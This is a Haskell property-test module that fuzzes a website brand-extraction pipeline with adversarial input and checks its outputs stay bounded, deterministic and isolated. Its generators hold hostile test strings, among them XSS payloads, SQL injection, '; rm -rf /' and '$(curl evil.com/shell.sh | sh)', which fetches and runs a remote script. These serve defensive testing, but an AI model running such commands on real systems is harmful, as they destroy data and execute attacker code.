{- |
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                             // foundry // extract // security
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Module      : Test.Foundry.Extract.Security
Description : HARD security tests for brand extraction pipeline
Copyright   : (c) Straylight Software, 2026
License     : BSD-3-Clause

"Norman Stansfield energy - EVERYONE gets tested."

These tests verify that the extraction pipeline is SAFE for AI agent operation.
An agent ingesting arbitrary websites MUST NOT:

1. Crash on malicious input
2. Produce invalid output (NaN, Infinity, out-of-range)
3. Allow poison in one module to corrupt another
4. Produce non-deterministic results
5. Hang or exhaust resources

== Test Philosophy

Surface-level "doesn't crash" is NOT enough. We verify:

- Output INVARIANTS hold even with poison input
- Cross-module ISOLATION prevents contamination
- DETERMINISM: same poison → same safe output
- OUTPUT SANITIZATION: all values in valid ranges
- RESOURCE BOUNDS: no hangs on crafted input

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-}
module Test.Foundry.Extract.Security (tests) where

import Test.Tasty (TestTree, testGroup)
import Test.Tasty.Hedgehog (testProperty)
import Hedgehog
  ( Gen
  , Property
  , forAll
  , property
  , assert
  , (===)
  , annotate
  , annotateShow
  )
import Hedgehog.Gen qualified as Gen
import Hedgehog.Range qualified as Range

import Data.Text (Text)
import Data.Text qualified as T

import Foundry.Extract.Color.CSS
  ( RGB (..)
  , OKLCH' (..)
  , parseColorText
  , rgbToOKLCH
  )
import Foundry.Extract.Color.Cluster (oklchDistance)
import Foundry.Extract.Typography.Scale (DetectedScale (..), detectScaleFromSizes)
import Foundry.Core.Brand.Spacing (SpacingScale (..))
import Foundry.Extract.Spacing (detectBaseUnit, detectSpacingScale)
import Foundry.Extract.Voice.NLP
  ( TextAnalysis (..)
  , analyzeText
  )

--------------------------------------------------------------------------------
-- Test Tree
--------------------------------------------------------------------------------

tests :: TestTree
tests = testGroup "Security"
  [ testGroup "ColorInvariants"
      [ testProperty "OKLCH L always in [0,1] for ANY RGB input" prop_oklch_L_bounded
      , testProperty "OKLCH C always in [0,0.4] for ANY RGB input" prop_oklch_C_bounded
      , testProperty "OKLCH H always in [0,360) for ANY RGB input" prop_oklch_H_bounded
      , testProperty "OKLCH A always in [0,1] for ANY RGB input" prop_oklch_A_bounded
      , testProperty "OKLCH values never NaN for wild RGB" prop_oklch_no_nan
      , testProperty "OKLCH values never Infinite for wild RGB" prop_oklch_no_infinite
      , testProperty "color distance always non-negative" prop_distance_nonnegative
      , testProperty "color distance always finite" prop_distance_finite
      ]
  , testGroup "ColorDeterminism"
      [ testProperty "same poison CSS → same Nothing every time" prop_color_parse_deterministic
      , testProperty "same wild RGB → same OKLCH every time" prop_rgb_to_oklch_deterministic
      ]
  , testGroup "TypographyInvariants"
      [ testProperty "scale ratio always positive or Nothing" prop_scale_positive_or_nothing
      , testProperty "scale ratio never NaN" prop_scale_no_nan
      , testProperty "scale ratio never Infinite" prop_scale_no_infinite
      , testProperty "scale detection is deterministic" prop_scale_deterministic
      ]
  , testGroup "SpacingInvariants"
      [ testProperty "base unit always positive" prop_base_positive
      , testProperty "base unit never NaN" prop_base_no_nan
      , testProperty "base unit never Infinite" prop_base_no_infinite
      , testProperty "spacing detection is deterministic" prop_spacing_deterministic
      , testProperty "spacing scale valid or Nothing" prop_spacing_scale_valid
      ]
  , testGroup "VoiceInvariants"
      [ testProperty "word count always non-negative" prop_word_count_nonnegative
      , testProperty "sentence count always non-negative" prop_sentence_count_nonnegative
      , testProperty "formality always in [0,1]" prop_formality_bounded
      , testProperty "formality never NaN" prop_formality_no_nan
      , testProperty "voice analysis is deterministic" prop_voice_deterministic
      , testProperty "XSS doesn't execute, just counts words" prop_xss_counted_not_executed
      , testProperty "SQL injection is just text" prop_sql_is_just_text
      ]
  , testGroup "CrossModuleIsolation"
      [ testProperty "poison color CSS doesn't affect typography" prop_color_typography_isolation
      , testProperty "poison text doesn't affect spacing" prop_text_spacing_isolation
      ]
  , testGroup "ResourceBounds"  
      [ testProperty "long color strings terminate" prop_long_color_terminates
      , testProperty "many spacing values terminate" prop_many_spacing_terminates
      , testProperty "huge text terminates" prop_huge_text_terminates
      ]
  ]

--------------------------------------------------------------------------------
-- Adversarial Generators
--------------------------------------------------------------------------------

-- | Generate completely wild RGB values (including invalid ones)
genWildRGB :: Gen RGB
genWildRGB = RGB
  <$> genWildDouble
  <*> genWildDouble
  <*> genWildDouble
  <*> genWildDouble

-- | Generate wild doubles including edge cases
genWildDouble :: Gen Double
genWildDouble = Gen.choice
  [ Gen.double (Range.linearFrac (-1e10) 1e10)  -- Normal range
  , Gen.element [0, -0, 255, -255, 256, -256]   -- Boundary values
  , Gen.element [1e308, -1e308, 1e-308]         -- Near limits
  , pure 0                                       -- Zero
  ]

-- | Generate poison CSS color strings
genPoisonCSS :: Gen Text
genPoisonCSS = Gen.choice
  [ -- Malformed hex
    Gen.element ["#", "#z", "#12345", "#1234567890", "#gggggg"]
  , -- Overflow values
    Gen.element 
      [ "rgb(999999, 0, 0)"
      , "rgb(-1e308, 1e308, 0)"
      , "rgb(1e400, 0, 0)"
      , "hsl(99999, 500%, -100%)"
      ]
  , -- Injection attempts
    Gen.element
      [ "expression(alert(1))"
      , "url(javascript:evil)"
      , "; DROP TABLE colors; --"
      , "<script>steal(document.cookie)</script>"
      ]
  , -- Unicode attacks
    Gen.element
      [ "\x202E" <> "rgb(255,0,0)" <> "\x202C"   -- RTL override
      , "\x200B" <> "#ffffff"                    -- Zero-width space
      , "rgb(" <> "\xFEFF" <> "255,0,0)"         -- BOM in middle
      ]
  , -- Deeply nested
    do depth <- Gen.int (Range.linear 10 50)
       let opens = T.replicate depth "("
           closes = T.replicate depth ")"
       pure $ "rgb" <> opens <> "255,0,0" <> closes
  , -- Very long
    do len <- Gen.int (Range.linear 100 1000)
       pure $ "#" <> T.replicate len "f"
  ]

-- | Generate poison font sizes for scale detection
genPoisonFontSizes :: Gen [Double]
genPoisonFontSizes = Gen.choice
  [ -- Normal but adversarial
    Gen.list (Range.linear 1 20) genWildDouble
  , -- All same (division by zero potential)
    do n <- Gen.int (Range.linear 2 10)
       v <- genWildDouble
       pure $ replicate n v
  , -- Empty
    pure []
  , -- Single
    fmap pure genWildDouble
  , -- Alternating signs
    do n <- Gen.int (Range.linear 2 10)
       pure $ take n $ cycle [16, -16, 24, -24]
  , -- Geometric explosion
    pure [1, 10, 100, 1000, 10000, 100000]
  ]

-- | Generate poison spacing values
genPoisonSpacing :: Gen [Double]
genPoisonSpacing = Gen.choice
  [ Gen.list (Range.linear 0 50) genWildDouble
  , pure []
  , pure [0, 0, 0, 0]
  , do n <- Gen.int (Range.linear 100 500)
       pure $ replicate n 8
  ]

-- | Generate poison text for NLP
genPoisonText :: Gen Text
genPoisonText = Gen.choice
  [ -- XSS payloads
    Gen.element
      [ "<script>alert('XSS')</script>"
      , "<img src=x onerror=alert(1)>"
      , "'\"><script>document.location='evil.com'</script>"
      ]
  , -- SQL injection
    Gen.element
      [ "'; DROP TABLE brands; --"
      , "1 OR 1=1 UNION SELECT * FROM secrets"
      , "admin'--"
      ]
  , -- Command injection
    Gen.element
      [ "; rm -rf /"
      , "$(curl evil.com/shell.sh | sh)"
      , "`id`"
      ]
  , -- Unicode attacks
    Gen.element
      [ "\x202E\x202Dhidden text"
      , "\x200B\x200B\x200Binvisible"
      , "normal\x0000\x0000hidden"
      ]
  , -- Very long text
    do len <- Gen.int (Range.linear 1000 5000)
       pure $ T.replicate len "word "
  , -- Only whitespace
    do len <- Gen.int (Range.linear 0 100)
       pure $ T.replicate len " "
  , -- Only punctuation
    pure "!@#$%^&*()_+-=[]{}|;':\",./<>?"
  ]

--------------------------------------------------------------------------------
-- Color Invariant Tests
--------------------------------------------------------------------------------

prop_oklch_L_bounded :: Property
prop_oklch_L_bounded = property $ do
  rgb <- forAll genWildRGB
  let oklch = rgbToOKLCH rgb
  annotateShow rgb
  annotateShow oklch
  -- L MUST be in [0, 1] no matter what garbage RGB we feed
  assert $ oklchL' oklch >= 0
  assert $ oklchL' oklch <= 1

prop_oklch_C_bounded :: Property
prop_oklch_C_bounded = property $ do
  rgb <- forAll genWildRGB
  let oklch = rgbToOKLCH rgb
  annotateShow oklch
  -- C MUST be in [0, 0.4] (clamped in implementation)
  assert $ oklchC' oklch >= 0
  assert $ oklchC' oklch <= 0.4

prop_oklch_H_bounded :: Property
prop_oklch_H_bounded = property $ do
  rgb <- forAll genWildRGB
  let oklch = rgbToOKLCH rgb
  annotateShow oklch
  -- H MUST be in [0, 360)
  assert $ oklchH' oklch >= 0
  assert $ oklchH' oklch < 360

prop_oklch_A_bounded :: Property
prop_oklch_A_bounded = property $ do
  rgb <- forAll genWildRGB
  let oklch = rgbToOKLCH rgb
  annotateShow oklch
  -- A should preserve the input alpha (even if wild)
  -- But it MUST NOT be NaN
  assert $ not $ isNaN (oklchA' oklch)

prop_oklch_no_nan :: Property
prop_oklch_no_nan = property $ do
  rgb <- forAll genWildRGB
  let oklch = rgbToOKLCH rgb
  annotateShow rgb
  annotateShow oklch
  -- NO field can be NaN
  assert $ not $ isNaN (oklchL' oklch)
  assert $ not $ isNaN (oklchC' oklch)
  assert $ not $ isNaN (oklchH' oklch)
  assert $ not $ isNaN (oklchA' oklch)

prop_oklch_no_infinite :: Property
prop_oklch_no_infinite = property $ do
  rgb <- forAll genWildRGB
  let oklch = rgbToOKLCH rgb
  annotateShow rgb
  annotateShow oklch
  -- NO field can be Infinite
  assert $ not $ isInfinite (oklchL' oklch)
  assert $ not $ isInfinite (oklchC' oklch)
  assert $ not $ isInfinite (oklchH' oklch)
  assert $ not $ isInfinite (oklchA' oklch)

prop_distance_nonnegative :: Property
prop_distance_nonnegative = property $ do
  rgb1 <- forAll genWildRGB
  rgb2 <- forAll genWildRGB
  let oklch1 = rgbToOKLCH rgb1
      oklch2 = rgbToOKLCH rgb2
      dist = oklchDistance oklch1 oklch2
  annotateShow (oklch1, oklch2, dist)
  assert $ dist >= 0

prop_distance_finite :: Property
prop_distance_finite = property $ do
  rgb1 <- forAll genWildRGB
  rgb2 <- forAll genWildRGB
  let oklch1 = rgbToOKLCH rgb1
      oklch2 = rgbToOKLCH rgb2
      dist = oklchDistance oklch1 oklch2
  annotateShow (oklch1, oklch2, dist)
  assert $ not $ isNaN dist
  assert $ not $ isInfinite dist

--------------------------------------------------------------------------------
-- Color Determinism Tests
--------------------------------------------------------------------------------

prop_color_parse_deterministic :: Property
prop_color_parse_deterministic = property $ do
  poison <- forAll genPoisonCSS
  -- Parse twice, must get same result
  let result1 = parseColorText poison
      result2 = parseColorText poison
  annotate $ "Input: " <> T.unpack poison
  result1 === result2

prop_rgb_to_oklch_deterministic :: Property
prop_rgb_to_oklch_deterministic = property $ do
  rgb <- forAll genWildRGB
  let oklch1 = rgbToOKLCH rgb
      oklch2 = rgbToOKLCH rgb
  annotateShow rgb
  oklch1 === oklch2

--------------------------------------------------------------------------------
-- Typography Invariant Tests
--------------------------------------------------------------------------------

prop_scale_positive_or_nothing :: Property
prop_scale_positive_or_nothing = property $ do
  sizes <- forAll genPoisonFontSizes
  let result = detectScaleFromSizes sizes
  annotateShow sizes
  annotateShow result
  case result of
    Nothing -> assert True
    Just ds -> assert $ dsRatio ds > 0

prop_scale_no_nan :: Property
prop_scale_no_nan = property $ do
  sizes <- forAll genPoisonFontSizes
  let result = detectScaleFromSizes sizes
  annotateShow sizes
  case result of
    Nothing -> assert True
    Just ds -> do
      assert $ not $ isNaN (dsRatio ds)
      assert $ not $ isNaN (dsBaseSize ds)
      assert $ not $ isNaN (dsConfidence ds)

prop_scale_no_infinite :: Property
prop_scale_no_infinite = property $ do
  sizes <- forAll genPoisonFontSizes
  let result = detectScaleFromSizes sizes
  annotateShow sizes
  case result of
    Nothing -> assert True
    Just ds -> do
      assert $ not $ isInfinite (dsRatio ds)
      assert $ not $ isInfinite (dsBaseSize ds)
      assert $ not $ isInfinite (dsConfidence ds)

prop_scale_deterministic :: Property
prop_scale_deterministic = property $ do
  sizes <- forAll genPoisonFontSizes
  let result1 = detectScaleFromSizes sizes
      result2 = detectScaleFromSizes sizes
  annotateShow sizes
  result1 === result2

--------------------------------------------------------------------------------
-- Spacing Invariant Tests
--------------------------------------------------------------------------------

-- | detectBaseUnit returns Double (not Maybe), defaults to 8.0 or 16.0
prop_base_positive :: Property
prop_base_positive = property $ do
  spacing <- forAll genPoisonSpacing
  let base = detectBaseUnit spacing
  annotateShow spacing
  annotateShow base
  -- Base unit is ALWAYS positive (function defaults to 8.0 or 16.0)
  assert $ base > 0

prop_base_no_nan :: Property
prop_base_no_nan = property $ do
  spacing <- forAll genPoisonSpacing
  let base = detectBaseUnit spacing
  -- Must never be NaN
  assert $ not $ isNaN base

prop_base_no_infinite :: Property
prop_base_no_infinite = property $ do
  spacing <- forAll genPoisonSpacing
  let base = detectBaseUnit spacing
  -- Must never be Infinite
  assert $ not $ isInfinite base

prop_spacing_deterministic :: Property
prop_spacing_deterministic = property $ do
  spacing <- forAll genPoisonSpacing
  let base1 = detectBaseUnit spacing
      base2 = detectBaseUnit spacing
  base1 === base2

prop_spacing_scale_valid :: Property
prop_spacing_scale_valid = property $ do
  spacing <- forAll genPoisonSpacing
  let result = detectSpacingScale spacing
  annotateShow spacing
  case result of
    Nothing -> assert True
    Just scale -> do
      -- Scale base and ratio must be valid
      assert $ not $ isNaN (spacingScaleBase scale)
      assert $ not $ isInfinite (spacingScaleBase scale)
      assert $ not $ isNaN (spacingScaleRatio scale)
      assert $ not $ isInfinite (spacingScaleRatio scale)

--------------------------------------------------------------------------------
-- Voice Invariant Tests
--------------------------------------------------------------------------------

prop_word_count_nonnegative :: Property
prop_word_count_nonnegative = property $ do
  text <- forAll genPoisonText
  let analysis = analyzeText text
  annotate $ "Input: " <> T.unpack text
  annotateShow analysis
  assert $ taWordCount analysis >= 0

prop_sentence_count_nonnegative :: Property
prop_sentence_count_nonnegative = property $ do
  text <- forAll genPoisonText
  let analysis = analyzeText text
  assert $ taSentenceCount analysis >= 0

prop_formality_bounded :: Property
prop_formality_bounded = property $ do
  text <- forAll genPoisonText
  let analysis = analyzeText text
  annotateShow analysis
  assert $ taFormality analysis >= 0
  assert $ taFormality analysis <= 1

prop_formality_no_nan :: Property
prop_formality_no_nan = property $ do
  text <- forAll genPoisonText
  let analysis = analyzeText text
  assert $ not $ isNaN (taFormality analysis)
  assert $ not $ isNaN (taAvgSentenceLen analysis)

prop_voice_deterministic :: Property
prop_voice_deterministic = property $ do
  text <- forAll genPoisonText
  let analysis1 = analyzeText text
      analysis2 = analyzeText text
  analysis1 === analysis2

prop_xss_counted_not_executed :: Property
prop_xss_counted_not_executed = property $ do
  let xss = "<script>alert('XSS')</script>"
      analysis = analyzeText xss
  -- XSS should be treated as regular text, counting words
  -- "script alert XSS script" - but depends on tokenization
  -- Key point: it returns a TextAnalysis, not crashes or executes
  assert $ taWordCount analysis >= 0
  assert $ taFormality analysis >= 0
  assert $ taFormality analysis <= 1

prop_sql_is_just_text :: Property
prop_sql_is_just_text = property $ do
  let sql = "'; DROP TABLE brands; --"
      analysis = analyzeText sql
  -- SQL injection should be treated as regular text
  assert $ taWordCount analysis >= 0
  -- Should not have executed (no side effects to check, but we can verify output is valid)
  assert $ taFormality analysis >= 0
  assert $ taFormality analysis <= 1

--------------------------------------------------------------------------------
-- Cross-Module Isolation Tests
--------------------------------------------------------------------------------

prop_color_typography_isolation :: Property
prop_color_typography_isolation = property $ do
  poisonCSS <- forAll genPoisonCSS
  -- Attempt to parse poison CSS
  let _ = parseColorText poisonCSS
  -- Now do typography detection - should be unaffected
  let sizes = [16, 20, 24, 32, 48]
      result = detectScaleFromSizes sizes
  annotate $ "Poison CSS: " <> T.unpack poisonCSS
  -- Typography should work normally after color poison
  case result of
    Nothing -> assert True  -- Shouldn't happen for valid sizes
    Just ds -> do
      assert $ dsRatio ds > 0
      assert $ not $ isNaN (dsRatio ds)

prop_text_spacing_isolation :: Property
prop_text_spacing_isolation = property $ do
  poisonText <- forAll genPoisonText
  -- Analyze poison text
  let _ = analyzeText poisonText
  -- Now do spacing detection - should be unaffected
  let spacing = [4, 8, 12, 16, 24, 32]
      base = detectBaseUnit spacing
  annotate $ "Poison text: " <> T.unpack poisonText
  -- Spacing should work normally after text poison (returns Double, not Maybe)
  assert $ base > 0
  assert $ not $ isNaN base

--------------------------------------------------------------------------------
-- Resource Bound Tests
--------------------------------------------------------------------------------

prop_long_color_terminates :: Property
prop_long_color_terminates = property $ do
  len <- forAll $ Gen.int (Range.linear 1000 10000)
  let longColor = "#" <> T.replicate len "f"
  -- Must terminate and return Nothing (not hang)
  let result = parseColorText longColor
  case result of
    Nothing -> assert True
    Just _  -> assert True  -- Surprisingly parsed, but didn't hang

prop_many_spacing_terminates :: Property
prop_many_spacing_terminates = property $ do
  n <- forAll $ Gen.int (Range.linear 100 1000)
  let manySpacing = replicate n 8.0
  -- Must terminate (returns Double, not Maybe)
  let base = detectBaseUnit manySpacing
  assert $ base > 0

prop_huge_text_terminates :: Property
prop_huge_text_terminates = property $ do
  n <- forAll $ Gen.int (Range.linear 1000 5000)
  let hugeText = T.replicate n "word "
  -- Must terminate
  let analysis = analyzeText hugeText
  assert $ taWordCount analysis >= 0
